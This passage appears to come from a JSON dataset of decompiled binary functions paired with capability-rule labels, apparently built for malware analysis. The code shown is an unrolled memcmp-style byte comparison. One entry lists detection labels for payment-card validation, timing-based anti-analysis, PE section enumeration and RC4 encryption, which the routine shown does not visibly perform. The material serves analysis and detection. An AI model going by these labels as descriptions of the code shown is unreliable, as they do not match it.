-0x16);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x0047862b:\n                if (*(arg_8h + arg_10h + -0x13) != *(arg_ch + arg_10h + -0x13)) {\n                    iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004786bf:\n                uVar1 = *(arg_8h + arg_10h + -0xf);\n                if (uVar1 != *(arg_ch + arg_10h + -0xf)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xf);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x00478752:\n                uVar1 = *(arg_8h + arg_10h + -0xb);\n                if (uVar1 != *(arg_ch + arg_10h + -0xb)) {\n                    iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xb);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                }\ncode_r0x004787e5:\n                if (*(arg_8h + arg_10h + -7) != *(arg_ch + arg_10h + -7)) {\n                    iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    iVar2 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n                    if (iVar2 != 0) {\n                        iVar2 = (0 < iVar2) * 2 + -1;\n                    }\n                    if (iVar2 != 0) {\n                        return iVar2;\n                    }\n                    goto code_r0x00477fae;\n                }\n                goto code_r0x00477ff2;\n            default:\n                goto code_r0x00477394;\n            }\n            return 0;\n        }\n        iVar2 = *arg_8h - *arg_ch;\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 1) - *(arg_ch + 1);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 2) - *(arg_ch + 2);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        uVar3 = *(arg_8h + 3);\n        uVar1 = *(arg_ch + 3);\n    }\n    if (uVar3 == uVar1) {\n        return 0;\n    }\n    return (0 < uVar3 - uVar1) * 2 + -1;\ncode_r0x00477394:\n    if (*arg_8h != *arg_ch) {\n        iVar2 = (*arg_8h & 0xff) - *arg_ch;\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 1) - *(arg_ch + 1);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 2) - *(arg_ch + 2);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 3) - *(arg_ch + 3);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[1] != arg_ch[1]) {\n        iVar2 = *(arg_8h + 1) - *(arg_ch + 1);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 5) - *(arg_ch + 5);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 6) - *(arg_ch + 6);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 7) - *(arg_ch + 7);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[2] != arg_ch[2]) {\n        iVar2 = *(arg_8h + 2) - *(arg_ch + 2);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 9) - *(arg_ch + 9);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 10) - *(arg_ch + 10);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[3] != arg_ch[3]) {\n        iVar2 = (arg_8h[3] & 0xff) - *(arg_ch + 3);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xd) - *(arg_ch + 0xd);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xe) - *(arg_ch + 0xe);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[4] != arg_ch[4]) {\n        iVar2 = (arg_8h[4] & 0xff) - *(arg_ch + 4);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x11) - *(arg_ch + 0x11);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x12) - *(arg_ch + 0x12);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[5] != arg_ch[5]) {\n        iVar2 = (arg_8h[5] & 0xff) - *(arg_ch + 5);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x15) - *(arg_ch + 0x15);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x16) - *(arg_ch + 0x16);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[6] != arg_ch[6]) {\n        iVar2 = (arg_8h[6] & 0xff) - *(arg_ch + 6);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x19) - *(arg_ch + 0x19);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1a) - *(arg_ch + 0x1a);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[7] != arg_ch[7]) {\n        iVar2 = (arg_8h[7] & 0xff) - *(arg_ch + 7);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1d) - *(arg_ch + 0x1d);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1e) - *(arg_ch + 0x1e);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    arg_8h = arg_8h + 8;\n    arg_ch = arg_ch + 8;\n    arg_10h = arg_10h + -0x20;\n    goto code_r0x00477831;\n}\n",
        "token_count": 13810
    },
    "004789ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.004789ca(uint32_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \ncode_r0x00478e68:\n    // switch table (32 cases) at 0x479f32\n    switch(arg_10h) {\n    case 0:\n        return 0;\n    case 0x1c:\n        uVar1 = *(arg_8h + arg_10h + -0x1c);\n        if (uVar1 != *(arg_ch + arg_10h + -0x1c)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1c);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x18:\n        if (*(arg_8h + arg_10h + -0x18) != *(arg_ch + arg_10h + -0x18)) {\n            iVar2 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + -0x16);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x14:\n        uVar1 = *(arg_8h + arg_10h + -0x14);\n        if (uVar1 != *(arg_ch + arg_10h + -0x14)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x14);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x10:\n        if (*(arg_8h + arg_10h + -0x10) != *(arg_ch + arg_10h + -0x10)) {\n            iVar2 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0xc:\n        uVar1 = *(arg_8h + arg_10h + -0xc);\n        if (uVar1 != *(arg_ch + arg_10h + -0xc)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xc);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 8:\n        if (*(arg_8h + arg_10h + -8) != *(arg_ch + arg_10h + -8)) {\n            iVar2 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 4:\n        uVar1 = *(arg_8h + arg_10h + -4);\n        if (uVar1 == *(arg_ch + arg_10h + -4)) {\n            return 0;\n        }\n        iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -4);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + arg_10h + -2) - *(arg_ch + arg_10h + -2);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 == 0) {\n            iVar2 = *(arg_8h + arg_10h + -1) - *(arg_ch + arg_10h + -1);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 == 0) {\n                return 0;\n            }\n            return iVar2;\n        }\n        return iVar2;\n    case 0x1d:\n        uVar1 = *(arg_8h + arg_10h + -0x1d);\n        if (uVar1 != *(arg_ch + arg_10h + -0x1d)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1d);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x19:\n        uVar1 = *(arg_8h + arg_10h + -0x19);\n        if (uVar1 != *(arg_ch + arg_10h + -0x19)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x19);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + -0x16);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x15:\n        uVar1 = *(arg_8h + arg_10h + -0x15);\n        if (uVar1 != *(arg_ch + arg_10h + -0x15)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x15);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x11:\n        uVar1 = *(arg_8h + arg_10h + -0x11);\n        if (uVar1 != *(arg_ch + arg_10h + -0x11)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x11);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0xd:\n        uVar1 = *(arg_8h + arg_10h + -0xd);\n        if (uVar1 != *(arg_ch + arg_10h + -0xd)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xd);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 9:\n        uVar1 = *(arg_8h + arg_10h + -9);\n        if (uVar1 != *(arg_ch + arg_10h + -9)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -9);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 5:\n        uVar1 = *(arg_8h + arg_10h + -5);\n        if (uVar1 != *(arg_ch + arg_10h + -5)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -5);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -4) - *(arg_ch + arg_10h + -4);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -2) - *(arg_ch + arg_10h + -2);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 1:\n        uVar3 = *(arg_8h + arg_10h + -1);\n        uVar1 = *(arg_ch + arg_10h + -1);\n        if (uVar3 != uVar1) {\n            return (0 < uVar3 - uVar1) * 2 + -1;\n        }\n        return 0;\n    case 0x1e:\n        uVar1 = *(arg_8h + arg_10h + -0x1e);\n        if (uVar1 != *(arg_ch + arg_10h + -0x1e)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1e);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1d) - *(arg_ch + arg_10h + -0x1d);\n            if (iVar2 != 